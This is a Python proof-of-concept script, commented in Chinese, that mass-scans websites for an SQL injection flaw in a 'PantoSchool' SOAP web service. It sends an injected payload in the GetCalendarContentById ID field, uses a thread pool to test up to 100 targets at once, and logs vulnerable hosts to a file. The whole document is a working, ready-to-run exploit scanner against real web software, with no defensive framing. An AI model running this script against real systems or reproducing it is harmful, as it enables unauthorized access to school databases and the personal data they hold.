import argparse  # 用于解析命令行参数
import sys  # 提供对解释器使用或影响解释器的函数和变量的访问
import requests  # 用于发送HTTP请求
import re  # 正则表达式模块，用于字符串匹配和操作
import time  # 提供时间相关的功能
from multiprocessing.dummy import Pool  # 使用线程池来并行处理任务
requests.packages.urllib3.disable_warnings()  # 禁用requests库中的警告
def main():
    parser = argparse.ArgumentParser(description="J_C")
    parser.add_argument('-u', '--url', dest='url', type=str, help="input link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []  
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()  
        mp.join()  
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h ")
def poc(target):
    payload_url = '/WebService_PantoSchool.asmx'
    url = target + payload_url
    header = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'close',
            'Cookie': 'ASP.NET_SessionId=e5l5acb3exqi5bmtezazrjsg',
            'Upgrade-Insecure-Requests': '1',
            'Priority': 'u=1',
            'SOAPAction': 'http://tempuri.org/GetCalendarContentById',
            'Content-Type': 'text/xml;charset=UTF-8',
            'Content-Length': '314'
    }
    data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetCalendarContentById>
         <!--type: string-->
         <tem:ID>-7793' OR 7994 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(120)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (7994=7994) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(106)+CHAR(113))) AND 'qciT'='qciT</tem:ID>
      </tem:GetCalendarContentById>
   </soapenv:Body>
</soapenv:Envelope>'''
    try:
        res1 = requests.get(url=target, headers=header, timeout=10)
        if res1.status_code == 200:
            res2 = requests.post(url=url, headers=header,data=data,timeout=10)
            if "qzxqq1qvpjq" in res2.text:
                print(f'[+] 该URL存在漏洞,地址为{target}')
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + "\n")
            else:
                print(f'[-] 该URL{target}不存在漏洞')
    except Exception as e:
        print(f'[*] 该URL{target}存在访问问题，请手工测试')

if __name__ == '__main__':
    main()
